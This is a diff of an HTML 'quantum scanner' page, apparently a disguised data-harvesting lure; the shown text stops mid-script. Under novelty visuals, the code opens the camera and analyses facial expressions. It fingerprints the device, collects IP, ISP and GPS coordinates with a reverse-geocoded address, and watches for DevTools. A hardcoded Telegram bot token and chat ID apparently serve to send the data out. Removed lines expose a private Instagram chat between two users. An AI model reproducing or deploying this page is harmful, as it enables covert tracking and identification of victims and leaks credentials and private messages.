@@ -1,45 +1,1224 @@
 <!DOCTYPE html>
 <html>
-   <title>⚡ ULTIMATE QUANTUM SCANNER v6.0 - FULLY FUNCTIONAL ⚡</title>
-  view-source:https://www.instagram.com/okaffb/
-  view-source:https://www.instagram.com/elizapede_17/
+<head>
+  <meta charset="UTF-8">
+  <title>⚡ ULTIMATE QUANTUM SCANNER v6.0 - FULLY FUNCTIONAL ⚡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+  <style>
+    /* ========== ROOT VARIABLES & CYBERPUNK THEME ========== */
+    :root {
+      --primary: #0ff;
+      --secondary: #f0f;
+      --accent: #ff0;
+      --bg: #0a0a0a;
+      --grid: rgba(0, 255, 255, 0.2);
+      --hologram: rgba(0, 255, 255, 0.1);
+      --scanline: rgba(255, 0, 255, 0.3);
+      --glow: 0 0 15px currentColor;
+    }
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Courier New', monospace;
+      text-align: center;
+      padding: 20px;
+      background: var(--bg);
+      color: var(--primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      overflow-x: hidden;
+      background-image: 
+        linear-gradient(var(--grid) 1px, transparent 1px),
+        linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+      background-size: 30px 30px;
+      animation: bgScroll 10s linear infinite;
+      transition: all 0.3s;
+    }
+    body.glitch-active {
+      animation: glitch-bg 0.2s infinite;
+      filter: hue-rotate(90deg) contrast(200%);
+    }
+    @keyframes glitch-bg {
+      0% { transform: translate(2px, 2px); }
+      25% { transform: translate(-2px, -2px); }
+      50% { transform: translate(2px, -2px); }
+      75% { transform: translate(-2px, 2px); }
+      100% { transform: translate(0); }
+    }
+    @keyframes bgScroll {
+      0% { background-position: 0 0; }
+      100% { background-position: 30px 30px; }
+    }
+    .hologram-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      background: radial-gradient(circle at 50% 50%, transparent 0%, var(--bg) 100%);
+      mix-blend-mode: overlay;
+      opacity: 0.3;
+      z-index: 9998;
+      animation: pulseHolo 4s ease-in-out infinite;
+    }
+    @keyframes pulseHolo {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 0.4; }
+    }
+    .glitch {
+      text-shadow: 2px 2px var(--secondary), -2px -2px var(--primary);
+      animation: glitch 2s infinite;
+    }
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(2px, -2px); }
+      60% { transform: translate(-1px, 1px); }
+      80% { transform: translate(1px, -1px); }
+      100% { transform: translate(0); }
+    }
+    .scanner-box {
+      position: relative;
+      width: 300px;
+      height: 300px;
+      margin: 20px auto;
+      overflow: hidden;
+      border: 2px solid var(--primary);
+      box-shadow: 0 0 30px var(--primary);
+      border-radius: 10px;
+    }
+    .scanner-box video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .scanner-line {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: linear-gradient(to right, transparent, var(--primary), transparent);
+      animation: scanLine 2s linear infinite;
+      z-index: 2;
+      box-shadow: 0 0 10px var(--primary);
+    }
+    @keyframes scanLine {
+      0% { top: 0; }
+      100% { top: 100%; }
+    }
+    #radarCanvas {
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      border: 2px solid var(--primary);
+      box-shadow: 0 0 20px var(--primary);
+      margin: 10px auto;
+    }
+    #scan-progress-container {
+      width: 80%;
+      height: 20px;
+      background: #111;
+      border: 1px solid var(--primary);
+      border-radius: 10px;
+      margin: 15px auto;
+      overflow: hidden;
+      box-shadow: inset 0 0 5px #000, 0 0 10px var(--primary);
+    }
+    #scan-progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      transition: width 0.3s;
+    }
+    .dashboard {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 15px;
+      width: 100%;
+      max-width: 1400px;
+      margin: 20px 0;
+    }
+    .card {
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid var(--primary);
+      border-radius: 10px;
+      padding: 15px;
+      backdrop-filter: blur(5px);
+      box-shadow: 0 0 20px var(--primary);
+      text-align: left;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    .card h3 {
+      margin-top: 0;
+      color: var(--secondary);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      border-bottom: 1px solid var(--primary);
+      padding-bottom: 5px;
+      position: sticky;
+      top: 0;
+      background: rgba(0,0,0,0.8);
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 5px 0;
+      border-bottom: 1px dotted var(--primary);
+      font-size: 0.9rem;
+    }
+    .info-label {
+      color: var(--accent);
+    }
+    .info-value {
+      font-weight: bold;
+      text-align: right;
+      word-break: break-word;
+      max-width: 60%;
+    }
+    button {
+      background: transparent;
+      border: 2px solid var(--primary);
+      color: var(--primary);
+      padding: 12px 24px;
+      font-size: 1.2rem;
+      font-family: 'Courier New', monospace;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      cursor: pointer;
+      margin: 15px;
+      border-radius: 5px;
+      box-shadow: 0 0 15px var(--primary);
+      transition: 0.2s;
+      animation: pulseBtn 1.5s infinite;
+    }
+    button:hover {
+      background: var(--primary);
+      color: #000;
+      box-shadow: 0 0 30px var(--primary);
+    }
+    @keyframes pulseBtn {
+      0% { opacity: 0.8; }
+      50% { opacity: 1; transform: scale(1.02); }
+      100% { opacity: 0.8; }
+    }
+    #loading {
+      color: var(--secondary);
+      animation: blink 1s step-end infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .hologram-effect {
+      position: fixed;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%), linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%), linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%), linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
+      background-size: 20px 20px;
+      pointer-events: none;
+      mix-blend-mode: overlay;
+      opacity: 0.3;
+      z-index: 9999;
+      animation: hologram 20s linear infinite;
+    }
+    @keyframes hologram {
+      from { transform: translate(-50%, -50%) rotate(0deg); }
+      to { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    #kill-switch-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 0, 0, 0.5);
+      z-index: 10000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      font-size: 4rem;
+      color: white;
+      text-shadow: 0 0 20px red;
+      backdrop-filter: blur(10px);
+      animation: killFlash 0.5s infinite;
+      pointer-events: none;
+    }
+    @keyframes killFlash {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div class="hologram-overlay"></div>
+  <div class="hologram-effect"></div>
+  <div id="kill-switch-overlay">⚠️ SYSTEM OVERRIDE ⚠️</div>
 
-  
-generate period Jan 26 to Mar 26
-1035913242_main
-  {20/03/2026|14:04:67} Okaffb:Lebaran dimana woi
-    {20/03/2026|19:14:34} elizapede_17:sumedabg bang, mana thr?
-    {20/03/2026|20:12:57} Okaffb:unin ga ikut ke jkt sama kk sama abang? uti? 
-    {20/03/2026|19:04:00} elizapede_17:ga bang, disumedang
-   {21/03/2026|14:12:03} Okaffb:mohon maaf lahir batin uti, ga kesini ga dapat thr
-    {21/03/2026|18:02:57} elizapede_17:mohon maaf lahir batin bang, curang
-   {23/03/2026|12:42:05} Okaffb:ya kalau mau kesini inta ada oma opa sampe minggu depan masih ada
-    {23/03/2026|19:04:37} elizapede_17:iya liat nanti bang
-  {23/03/2026|20:01:12} Okaffb:ya ti
-    {25/03/2026|16:04:03} elizapede_17:Eh minggu depan mah ada acaraaa uti nyaaag
-  
-  
-https://static.cdninstagram.com/rsrc.php/v5/yK/l/0,cross/yXz3AZPSiphbgrNkRAHfEEWAcQkLAlwy9P_NAqbozHHDPvJg89IT9OsfgQe914iiBfONMKn3YhINqddoA3wRPOftU49pVNahkCkGqIRdUZFW9uQvuWABIjhhRs97xFZK--hBruhBENOpKm_.css" as="style" crossorigin="anonymous" />
-<link rel="preload" href="https://static.cdninstagram.com/rsrc.php/v4/y0/r/K_qdq0oYvfR.js" as="script" crossorigin="an
+  <h1 class="glitch">🛸 ULTIMATE QUANTUM SCANNER v6.0 🛸</h1>
 
+  <div class="scanner-box">
+    <div class="scanner-line"></div>
+    <video id="video" autoplay playsinline muted></video>
+  </div>
 
-  ;/*FB_PKG_DELIM*/
-  src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ
-  src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW
-  <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20uc
-   <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJ
-     data-content-len="355"
-    <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20ucHJvY2VzcygpO30sbnVsbCwweDEwMCk=" nonce="XDYPPA2a" data-btmanifest="1035913242_main"></script>
-<script type="application/json"  data-content-len="83" data-sjs>{"require":[["qplTimingsServerJS",null,null,["7621129790305828379","tierTwoEnd"]]]
-    data-sjs>{"require":[["CometSSRMergedContentInjector","onViewportGuessV
-    data-sjs>{"require":[["CometSSRMergedContentInjector","onPayloadReceived",null,[{"fizzRootId":"ssrb_root_content","id":"render_pass_1","payloadType":"OTHER","readyPreloaders":["adp_PolarisSuggestedUserListQueryRelayPreloader_69c3ae45758d11c34574362"],"renderPassCount":1,"status":"success"},{"clientRenderErrors":[],"productRecoverableErrors":[]}]]]}</script>
-    <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20ucHJvY2VzcygpO30sbnVsbCwweDEwMCk="
-__d("MaybeNativePromise",["Promise"],(function(t,n,r,o,a,i){"use strict";var e,l=t.Promise||e||(e=n("Promise"));(e||(e=n("Promise"))).resolve();var s=l;i.default=s}),66);
-       data-content-len="341"
-    data-sjs>{"require":[["CometSSRMergedContentInjector
-      <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20ucHJvY2VzcygpO30sbnVsbCwweDEwMCk=" nonce="XDYPPA2a" data-btmanifest="1035913242_main"></script>
-__d("LatencySensitiveType",["$InternalEnum"],(function(t,n,r,o,a,i){var e=n("$InternalEnum")({NORMAL:0,LOW:1,ULTRA_LOW:2}),l=e;i.default=l}),66);
-  </style><style data-btmanifest="1035913242_main" nonce="EkViq5U3">
-    profileTrackingData:te,schoolPartnerProfileBadgeQuery:_.schoolPartnerProfileBadgeQuery
+  <canvas id="radarCanvas" width="200" height="200"></canvas>
+
+  <div id="scan-progress-container">
+    <div id="scan-progress-fill"></div>
+  </div>
+
+  <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
+  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
+
+  <!-- DASHBOARD -->
+  <div class="dashboard">
+    <!-- CARD 1: Device Matrix -->
+    <div class="card">
+      <h3>⚙️ DEVICE MATRIX</h3>
+      <div id="device-info-content"></div>
+    </div>
+    <!-- CARD 2: CPU & Memory -->
+    <div class="card">
+      <h3>🧠 CPU & MEMORY</h3>
+      <div class="info-row"><span class="info-label">CPU Cores</span><span id="cpu-cores" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Architecture</span><span id="cpu-arch" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">SIMD Support</span><span id="simd" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Throttling Score</span><span id="throttling" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Used Heap (MB)</span><span id="used-heap" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Total Heap (MB)</span><span id="total-heap" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Heap Limit (MB)</span><span id="heap-limit" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 3: GPU & Graphics -->
+    <div class="card">
+      <h3>🎮 GRAPHICS</h3>
+      <div class="info-row"><span class="info-label">GPU Vendor</span><span id="gpu-vendor" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">GPU Renderer</span><span id="gpu-renderer" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">WebGL Version</span><span id="webgl-version" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">WebGL Extensions</span><span id="webgl-ext" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">WebGPU</span><span id="webgpu" class="info-value">❌</span></div>
+    </div>
+    <!-- CARD 4: Display & Screen -->
+    <div class="card">
+      <h3>🖥️ DISPLAY</h3>
+      <div class="info-row"><span class="info-label">Refresh Rate (Hz)</span><span id="refresh-rate" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Color Depth</span><span id="color-depth" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Pixel Depth</span><span id="pixel-depth" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">HDR Support</span><span id="hdr" class="info-value">❌</span></div>
+      <div class="info-row"><span class="info-label">Color Gamut</span><span id="gamut" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 5: Battery & Power -->
+    <div class="card">
+      <h3>🔋 BATTERY</h3>
+      <div class="info-row"><span class="info-label">Level</span><span id="battery-level" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Charging</span><span id="battery-charging" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Discharging Time</span><span id="discharge-time" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 6: Storage -->
+    <div class="card">
+      <h3>💾 STORAGE</h3>
+      <div class="info-row"><span class="info-label">Quota (MB)</span><span id="quota" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Usage (MB)</span><span id="usage" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Persistent</span><span id="persistent" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 7: Audio -->
+    <div class="card">
+      <h3>🎵 AUDIO</h3>
+      <div class="info-row"><span class="info-label">Sample Rate</span><span id="sample-rate" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Audio Codecs</span><span id="audio-codecs" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Latency (ms)</span><span id="audio-latency" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Output Devices</span><span id="audio-out" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 8: Camera -->
+    <div class="card">
+      <h3>📷 CAMERA</h3>
+      <div class="info-row"><span class="info-label">Max Resolution</span><span id="cam-res" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Frame Rate</span><span id="cam-fps" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Torch Supported</span><span id="cam-torch" class="info-value">❌</span></div>
+    </div>
+    <!-- CARD 9: Sensors Real-time -->
+    <div class="card">
+      <h3>📳 SENSORS (LIVE)</h3>
+      <div class="info-row"><span class="info-label">Accel X</span><span id="accel-x" class="info-value">0</span></div>
+      <div class="info-row"><span class="info-label">Accel Y</span><span id="accel-y" class="info-value">0</span></div>
+      <div class="info-row"><span class="info-label">Accel Z</span><span id="accel-z" class="info-value">0</span></div>
+      <div class="info-row"><span class="info-label">Rotation α</span><span id="rot-alpha" class="info-value">0</span></div>
+      <div class="info-row"><span class="info-label">Rotation β</span><span id="rot-beta" class="info-value">0</span></div>
+      <div class="info-row"><span class="info-label">Rotation γ</span><span id="rot-gamma" class="info-value">0</span></div>
+    </div>
+    <!-- CARD 10: Network & ISP -->
+    <div class="card">
+      <h3>🌐 NETWORK DEEP</h3>
+      <div class="info-row"><span class="info-label">Public IP</span><span id="public-ip" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Local IP</span><span id="local-ip" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">ISP</span><span id="isp" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Download Speed</span><span id="speed" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Jitter (ms)</span><span id="jitter" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">VPN Detected</span><span id="vpn" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 11: Fingerprint & Identitas -->
+    <div class="card">
+      <h3>🆔 FINGERPRINT</h3>
+      <div class="info-row"><span class="info-label">Canvas FP</span><span id="canvas-fp" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">WebGL FP</span><span id="webgl-fp" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Audio FP</span><span id="audio-fp" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Fonts Installed</span><span id="fonts" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Unique Hash</span><span id="unique-hash" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 12: Keamanan & Privasi -->
+    <div class="card">
+      <h3>🔒 SECURITY</h3>
+      <div class="info-row"><span class="info-label">Do Not Track</span><span id="dnt" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">3rd Party Cookies</span><span id="third-cookies" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">AdBlocker</span><span id="adblock" class="info-value">❌</span></div>
+      <div class="info-row"><span class="info-label">TLS Version</span><span id="tls" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">HSTS</span><span id="hsts" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">VM Detected</span><span id="vm" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 13: Lokasi Premium -->
+    <div class="card">
+      <h3>📍 PREMIUM LOCATION</h3>
+      <div class="info-row"><span class="info-label">Coordinates</span><span id="loc-coords" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Accuracy (m)</span><span id="loc-acc" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Altitude (m)</span><span id="loc-alt" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Speed (m/s)</span><span id="loc-speed" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Estimated Address</span><span id="loc-address" class="info-value">N/A</span></div>
+    </div>
+    <!-- CARD 14: Face Mood Analysis -->
+    <div class="card">
+      <h3>😃 FACE QUANTUM MOOD</h3>
+      <div class="info-row"><span class="info-label">Expression</span><span id="face-expression" class="info-value">N/A</span></div>
+      <div class="info-row"><span class="info-label">Probability</span><span id="face-prob" class="info-value">N/A</span></div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ========== KONFIGURASI TELEGRAM ==========
+      const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+      const CHAT_ID = '1121369247';
+
+      // ========== VARIABEL GLOBAL ==========
+      let currentStream = null;
+      let isScanning = false;
+      const video = document.getElementById('video');
+      const loading = document.getElementById('loading');
+      const progressFill = document.getElementById('scan-progress-fill');
+      let faceApiLoaded = false;
+
+      // ========== RADAR ANIMATION ==========
+      const radarCanvas = document.getElementById('radarCanvas');
+      const ctxRadar = radarCanvas.getContext('2d');
+      function drawRadar() {
+        const w = 200, h = 200;
+        ctxRadar.clearRect(0, 0, w, h);
+        ctxRadar.strokeStyle = '#0ff';
+        ctxRadar.lineWidth = 1;
+        ctxRadar.beginPath();
+        ctxRadar.arc(100, 100, 80, 0, 2 * Math.PI);
+        ctxRadar.stroke();
+        ctxRadar.beginPath();
+        ctxRadar.arc(100, 100, 50, 0, 2 * Math.PI);
+        ctxRadar.stroke();
+        ctxRadar.beginPath();
+        ctxRadar.arc(100, 100, 20, 0, 2 * Math.PI);
+        ctxRadar.stroke();
+        ctxRadar.beginPath();
+        ctxRadar.moveTo(100, 20);
+        ctxRadar.lineTo(100, 180);
+        ctxRadar.stroke();
+        ctxRadar.beginPath();
+        ctxRadar.moveTo(20, 100);
+        ctxRadar.lineTo(180, 100);
+        ctxRadar.stroke();
+        let angle = (Date.now() / 500) % (2 * Math.PI);
+        ctxRadar.beginPath();
+        ctxRadar.moveTo(100, 100);
+        ctxRadar.lineTo(100 + 80 * Math.cos(angle), 100 + 80 * Math.sin(angle));
+        ctxRadar.strokeStyle = '#f0f';
+        ctxRadar.lineWidth = 2;
+        ctxRadar.stroke();
+        ctxRadar.fillStyle = '#ff0';
+        for (let i=0; i<5; i++) {
+          let x = 100 + Math.sin(i*2+Date.now()/1000)*40;
+          let y = 100 + Math.cos(i*3+Date.now()/800)*40;
+          ctxRadar.beginPath();
+          ctxRadar.arc(x, y, 3, 0, 2*Math.PI);
+          ctxRadar.fill();
+        }
+        requestAnimationFrame(drawRadar);
+      }
+      drawRadar();
+
+      // ========== FITUR DEVTOOLS DETECTION ==========
+      function detectDevTools() {
+        const threshold = 160;
+        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+        if (widthThreshold || heightThreshold) {
+          document.body.classList.add('glitch-active');
+          setTimeout(() => document.body.classList.remove('glitch-active'), 1000);
+        }
+      }
+      setInterval(detectDevTools, 1000);
+
+      // ========== KILL-SWITCH (SHAKE DETECTION) ==========
+      let lastAccel = { x: 0, y: 0, z: 0 };
+      window.addEventListener('devicemotion', e => {
+        if (e.acceleration) {
+          const accel = e.acceleration;
+          const delta = Math.abs(accel.x - lastAccel.x) + Math.abs(accel.y - lastAccel.y) + Math.abs(accel.z - lastAccel.z);
+          if (delta > 30) {
+            document.getElementById('kill-switch-overlay').style.display = 'flex';
+            setTimeout(() => document.getElementById('kill-switch-overlay').style.display = 'none', 2000);
+          }
+          lastAccel = { x: accel.x, y: accel.y, z: accel.z };
+        }
+      });
+
+      // ========== SPEECH SYNTHESIS ==========
+      function speak(text) {
+        if (!window.speechSynthesis) return;
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.rate = 0.9;
+        utterance.pitch = 0.5;
+        utterance.voice = speechSynthesis.getVoices().find(v => v.name.includes('Google UK')) || null;
+        speechSynthesis.speak(utterance);
+      }
+
+      // ========== ADVANCED FONT FINGERPRINTING ==========
+      function getInstalledFontsAdvanced() {
+        const fontList = [
+          "Arial", "Helvetica", "Times New Roman", "Courier New", "Verdana", "Georgia", "Comic Sans MS",
+          "Impact", "Tahoma", "Trebuchet MS", "Lucida Sans", "Palatino", "Garamond", "Bookman", "Avant Garde",
+          "Arial Black", "Arial Narrow", "Century Gothic", "Franklin Gothic Medium", "Lucida Console",
+          "Lucida Sans Unicode", "Microsoft Sans Serif", "Segoe UI", "Segoe UI Light", "Segoe UI Semibold",
+          "Segoe UI Symbol", "Candara", "Consolas", "Constantia", "Corbel", "Cambria", "Cambria Math",
+          "Calibri", "Calibri Light", "Helvetica Neue", "Helvetica Neue Light", "Roboto", "Roboto Light",
+          "Roboto Condensed", "Open Sans", "Open Sans Light", "Lato", "Lato Light", "Montserrat",
+          "Montserrat Light", "Raleway", "Raleway Light", "PT Sans", "PT Serif", "Noto Sans", "Noto Serif",
+          "Droid Sans", "Droid Serif", "Ubuntu", "Ubuntu Light", "Ubuntu Condensed", "Source Sans Pro",
+          "Source Code Pro", "Oswald", "Merriweather", "Merriweather Light", "Playfair Display",
+          "Playfair Display SC", "Bodoni MT", "Baskerville", "Didot", "Futura", "Gill Sans", "Gill Sans Light",
+          "Myriad Pro", "Myriad Hebrew", "Minion Pro", "Adobe Caslon Pro", "Avenir", "Avenir Light",
+          "Avenir Next", "Avenir Next Condensed", "Bebas Neue", "Bebas Neue Light", "Exo 2", "Exo 2 Light",
+          "Fira Sans", "Fira Sans Light", "Fira Code", "Inconsolata", "Menlo", "Monaco", "Consolas",
+          "Courier", "Andale Mono", "Monotype Corsiva", "Brush Script MT", "Lucida Handwriting", "Papyrus",
+          "Wingdings", "Webdings", "Symbol", "Zapf Dingbats"
+        ];
+        let available = [];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.font = '72px monospace';
+        const baseWidth = ctx.measureText('mmmmmmmmmm').width;
+        fontList.forEach(font => {
+          ctx.font = '72px "' + font + '", monospace';
+          const width = ctx.measureText('mmmmmmmmmm').width;
+          if (width !== baseWidth) available.push(font);
+        });
+        return available.slice(0, 10).join(', ') || 'None';
+      }
+
+      // ========== SPEED TEST & ISP ==========
+      async function measureDownloadSpeed() {
+        return new Promise(resolve => {
+          const img = new Image();
+          const startTime = performance.now();
+          img.onload = () => {
+            const endTime = performance.now();
+            const duration = (endTime - startTime) / 1000; // detik
+            // Ukuran gambar sekitar 50KB? Sebenarnya gambar logo wikipedia ~50KB
+            const speedMbps = (0.05 * 8 / duration).toFixed(2); // 50KB = 0.05 MB, *8 = Mbit
+            resolve(speedMbps + ' Mbps');
+          };
+          img.onerror = () => resolve('N/A');
+          img.src = 'https://upload.wikimedia.org/wikipedia/en/8/80/Wikipedia-logo-v2.svg?cache=' + Date.now();
+        });
+      }
+
+      async function getISP() {
+        try {
+          const res = await fetch('http://ip-api.com/json/');
+          const data = await res.json();
+          return data.isp || 'Unknown';
+        } catch {
+          return 'Unknown';
+        }
+      }
+
+      // ========== REVERSE GEOCODING ==========
+      async function reverseGeocode(lat, lon) {
+        try {
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+            headers: { 'User-Agent': 'QuantumScanner/1.0' }
+          });
+          const data = await res.json();
+          return data.display_name || 'Unknown';
+        } catch {
+          return 'Unknown';
+        }
+      }
+
+      // ========== FACE EXPRESSION ==========
+      async function detectExpression() {
+        if (!faceApiLoaded || !window.faceapi) return { expression: 'N/A', prob: 0 };
+        try {
+          const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceExpressions();
+          if (detections.length > 0) {
+            const expressions = detections[0].expressions;
+            const sorted = Object.entries(expressions).sort((a, b) => b[1] - a[1]);
+            return { expression: sorted[0][0], prob: (sorted[0][1] * 100).toFixed(0) + '%' };
+          }
+        } catch (e) {}
+        return { expression: 'N/A', prob: 0 };
+      }
+
+      // ========== FUNGSI LAMA (dari versi sebelumnya) ==========
+      // Semua fungsi lama diambil dari kode yang sudah ada dan disatukan di sini
+      // (CPU, GPU, memory, storage, battery, dll.)
+
+      // Deteksi arsitektur
+      function detectArch() {
+        const ua = navigator.userAgent;
+        if (ua.indexOf('WOW64') > -1 || ua.indexOf('Win64') > -1 || ua.indexOf('x86_64') > -1 || ua.indexOf('x64') > -1) return '64-bit';
+        else return '32-bit';
+      }
+
+      function detectSIMD() {
+        try {
+          return WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11]));
+        } catch { return false; }
+      }
+
+      async function cpuThrottlingScore() {
+        return new Promise(resolve => {
+          let results = [];
+          for (let t = 0; t < 3; t++) {
+            let start = performance.now();
+            for (let i = 0; i < 5e6; i++) Math.sqrt(i);
+            let end = performance.now();
+            results.push(end - start);
+          }
+          let avg = results.reduce((a,b)=>a+b,0)/results.length;
+          let score = Math.round(10000 / avg);
+          resolve(score);
+        });
+      }
+
+      function getHeapInfo() {
+        if (performance.memory) {
+          return {
+            usedJSHeapSize: (performance.memory.usedJSHeapSize / 1048576).toFixed(2),
+            totalJSHeapSize: (performance.memory.totalJSHeapSize / 1048576).toFixed(2),
+            jsHeapSizeLimit: (performance.memory.jsHeapSizeLimit / 1048576).toFixed(2)
+          };
+        }
+        return { usedJSHeapSize: 'N/A', totalJSHeapSize: 'N/A', jsHeapSizeLimit: 'N/A' };
+      }
+
+      function getWebGLInfo() {
+        let info = { version: 'N/A', extensions: [], renderer: 'N/A', vendor: 'N/A' };
+        try {
+          const canvas = document.createElement('canvas');
+          let gl = canvas.getContext('webgl2');
+          if (gl) info.version = 'WebGL 2.0';
+          else {
+            gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) info.version = 'WebGL 1.0';
+          }
+          if (gl) {
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debug) {
+              info.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+              info.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            }
+            info.extensions = gl.getSupportedExtensions().slice(0, 10);
+          }
+        } catch (e) {}
+        return info;
+      }
+
+      function detectWebGPU() {
+        return 'gpu' in navigator;
+      }
+
+      async function detectRefreshRate() {
+        return new Promise(resolve => {
+          let last = performance.now();
+          let frames = 0;
+          function count() {
+            frames++;
+            let now = performance.now();
+            if (now - last < 1000) requestAnimationFrame(count);
+            else resolve(Math.round(frames));
+          }
+          requestAnimationFrame(count);
